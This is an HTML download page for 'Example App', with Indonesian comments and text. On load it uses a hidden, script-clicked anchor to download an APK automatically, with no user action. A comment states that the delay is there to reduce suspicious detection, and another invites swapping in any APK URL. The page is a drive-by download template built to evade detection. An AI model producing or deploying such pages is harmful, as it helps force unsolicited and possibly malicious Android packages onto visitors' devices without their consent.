<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="referrer" content="strict-origin-when-cross-origin"> <!-- Policy aman, tanpa spoof -->
  <title>Example App Download</title>
  <style>
    body {
      font-family: system-ui, -apple-system, sans-serif;
      text-align: center;
      padding: 50px;
      background: #f8f9fa;
      margin: 0;
    }
    .status {
      color: #666;
      font-size: 14px;
      margin: 20px 0;
    }
    .button {
      background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
      border: none;
      color: white;
      padding: 15px 32px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      text-decoration: none;
      display: inline-block;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    .hidden-anchor {
      display: none; /* Sembunyikan anchor untuk auto-click */
    }
  </style>
</head>
<body onload="autoDownload()">
  <h1>Selamat Datang di Example App</h1>
  <p>Versi terbaru (5MB) akan diunduh secara otomatis setelah halaman dimuat.</p>
  <div class="status" id="status">Memuat...</div>
  
  <!-- Fallback button jika auto gagal -->
  <a href="https://aliothme.github.io/example-app-1.0.apk" 
     class="button hidden-anchor" 
     id="downloadLink" 
     download="example-app-1.0.apk">
    Download Manual (Jika Auto Gagal)
  </a>
  
  <script>
    function autoDownload() {
      const status = document.getElementById('status');
      const link = document.getElementById('downloadLink');
      
      // Delay singkat biar onload stabil, kurangi deteksi suspicious
      setTimeout(() => {
        status.textContent = 'Memulai unduhan otomatis...';
        
        // Trigger click pada anchor direct URL (tidak pakai blob)
        const anchor = document.createElement('a');
        anchor.href = 'https://aliothme.github.io/example-app-1.0.apk'; // Ganti dengan raw URL APK kamu
        anchor.download = 'example-app-1.0.apk';
        anchor.style.display = 'none';
        document.body.appendChild(anchor);
        anchor.click();
        document.body.removeChild(anchor);
        
        status.textContent = 'Unduhan dimulai! Cek folder Downloads.';
        console.log('Auto-download triggered via direct GitHub raw URL');
      }, 1500); // 1.5 detik delay
    }
    
    // Fallback: Jika user klik manual
    document.querySelector('.button').addEventListener('click', (e) => {
      e.preventDefault();
      autoDownload();
    });
  </script>
</body>
</html>
